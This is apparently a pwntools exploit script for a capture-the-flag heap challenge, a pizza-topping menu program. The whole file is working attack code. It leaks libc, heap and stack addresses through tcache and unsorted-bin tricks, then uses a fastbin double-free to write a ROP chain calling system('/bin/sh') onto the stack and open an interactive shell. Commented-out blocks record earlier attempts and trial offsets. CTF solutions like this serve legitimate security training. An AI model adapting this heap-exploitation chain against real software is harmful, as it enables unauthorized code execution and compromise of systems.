#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chal_patched")
libc = ELF("./libc.so.6")

gs = '''
b customize_topping
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:
# Topping is multiplied by 8


# Addresses
chunk_20 = 2
chunk_30 = 6
chunk_40 = 7
chunk_50 = 9
chunk_60 = 11
chunk_70 = 13
chunk_90 = 17

tomato = "Tomato"
onion = "Onion"
capsicum = "Capsicum"
corn = "Corn"
mushroom = "Mushroom"
pineapple = "Pineapple"
olives = "Olives"
doublecheese = "Double Cheese"
paneer = "Paneer"
chicken = "Chicken"

#size 10
toppings = [tomato, onion, capsicum, corn, mushroom, pineapple, olives, doublecheese, paneer, chicken]

# Functions
def add(topping: str, amount: int):
    io.sendlineafter(b"Enter your choice : ", b"1")
    io.sendlineafter(b"Which topping ?", topping.encode())
    io.sendlineafter(b"How much ?", str(amount).encode())

def customize(topping: str, data: bytes):
    io.sendlineafter(b"Enter your choice : ", b"2")
    io.sendlineafter(b"Which one to customize ?", topping.encode())
    io.sendlineafter(b"Enter new modified topping : ", data)

def remove(topping: str):
    io.sendlineafter(b"Enter your choice : ", b"3")
    io.sendlineafter(b"Which topping to remove ?", topping.encode())

def verify(topping: str):
    io.sendlineafter(b"Enter your choice : ", b"4")
    io.sendlineafter(b"Which topping to verify ?", topping.encode())
    io.recvline()
    leak = io.recvline().strip()
    return leak

def bake():
    io.sendlineafter(b"Enter your choice : ", b"5")

io = start()

# 1. Get a libc leak
# Start by requesting 8 0x90 size chunks
for i in range (8):
    add(toppings[i], chunk_90)

# Allocate a guard chunk
add(toppings[8], chunk_20)

# Free 7 of them, filling the 0x90 tcache
for i in range (7): # will free 0-6, 7 total
    remove(toppings[i])

# Free the 8th 0x90 chunk to put it into the unsortedbin
remove(toppings[7])

# "Verify" the 8th topping, toppings[7] and read the libc address
leak = verify(toppings[7])
libc_leak = u64(leak.ljust(8,b"\x00"))
log.success("Libc leak: %s" % hex(libc_leak))
libc.address = libc_leak - 0x219ce0 # offset found using gdb and vmmap
log.success("Libc base: %s" % hex(libc.address))

# Leak the heap base as well
leak = verify(toppings[0])
heap_base = u64(leak.ljust(8, b"\x00"))
log.success("Heap base: %s" % hex(heap_base))

# Leak heap pointer as well
leak = verify(toppings[1])
heap_ptr = (u64(leak.ljust(8, b"\x00")) ^ heap_base) + 0x555000000000
log.success("Heap ptr: %s" % hex(heap_ptr))

# 2. Try fastbin dup
# Allocate 10 

for i in range(10):
    add(toppings[i], chunk_50)

# Fill 0x70 tcache
for i in range(8):
    remove(toppings[i])

remove(toppings[8])
remove(toppings[9])
remove(toppings[8])

# Allocate from 0x60 tcache, 7 chunks
for i in range(7):
    add(toppings[i], chunk_50)

# Fastbin dup 0x60
target = libc.sym['__libc_argv']
add(toppings[8], chunk_50)
customize(toppings[8], p64(heap_base ^ target)) # 1
add(toppings[9], chunk_50)
add(toppings[8], chunk_50)
add(toppings[9], chunk_50)

leak = verify(toppings[9])
stack_leak = u64(leak.ljust(8,b"\x00"))
stack_leak1 = stack_leak
log.info("Stack leak: %s" % hex(stack_leak))
read_ret = stack_leak - 0xa70
log.info("Read ret: %s" % hex(read_ret))

for i in range(10):
    add(toppings[i], chunk_60)

for i in range(7):
    remove(toppings[i])

remove(toppings[8])
remove(toppings[9])
remove(toppings[8])

for i in range(7):
    add(toppings[i], chunk_60)


rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(libc.search(b"/bin/sh\x00")))


"""
stack_leak += 8
target = (stack_leak ^ heap_base)
log.info("Target: %s" % hex(target ^ heap_base))

add(toppings[8], chunk_50)
customize(toppings[8], p64(target))
add(toppings[9], chunk_50)
add(toppings[7], chunk_50)
add(toppings[8], chunk_50)
customize(toppings[8], rop.chain())
"""

#stack_leak -= 0x78
#stack_leak -= 0x118
#stack_leak -= 0x298
#stack_leak -= 0x2f8
#stack_leak -= 0x238
#stack_leak -= 0xa08
#stack_leak -= 0xa68
#stack_leak -= 0x798
#stack_leak -= 0x228
stack_leak -= 0x298
target = (stack_leak ^ heap_base)
log.info("Target: %s" % hex(target ^ heap_base))

add(toppings[8], chunk_60)
customize(toppings[8], p64(target))
add(toppings[9], chunk_60)
add(toppings[7], chunk_60)
add(toppings[8], chunk_60)
leak = verify(toppings[8])
print(leak)
customize(toppings[8], b"B"*0x38 + rop.chain()) # 2

"""
for i in range(10):
    add(toppings[i], chunk_40)



for i in range(7):
    remove(toppings[i])

remove(toppings[8])
remove(toppings[9])
remove(toppings[8])

for i in range(7):
    add(toppings[i], chunk_40)

target = stack_leak1 - 0x78
log.info("target: %s" % hex(target))
target = (target) ^ heap_base

add(toppings[8], chunk_40)
customize(toppings[8], p64(target))
add(toppings[9], chunk_40)
add(toppings[7], chunk_40)
add(toppings[8], chunk_40)
#customize(toppings[8], b"B")
"""
"""
# Make another fastbin dup with 0x70 bin
# We are using a larger bin to prevent allocating from the previous 0x60 chunks
for i in range(10):
    add(toppings[i], chunk_60)

for i in range(7):
    remove(toppings[i])


# Make fastbin dup
remove(toppings[8])
remove(toppings[9])
remove(toppings[8])


# Allocate all from tcache

for i in range(7):
    add(toppings[i], chunk_60)


add(toppings[7], chunk_60)
for i in range(10):
    customize(toppings[i], p64(target))
#add(toppings[8], chunk_60)
#add(toppings[9], chunk_60)


#customize(toppings[8], b"AAAAAAA")
#print(verify(toppings[8]))
#customize(toppings[9], b"CCC")
"""





io.interactive()
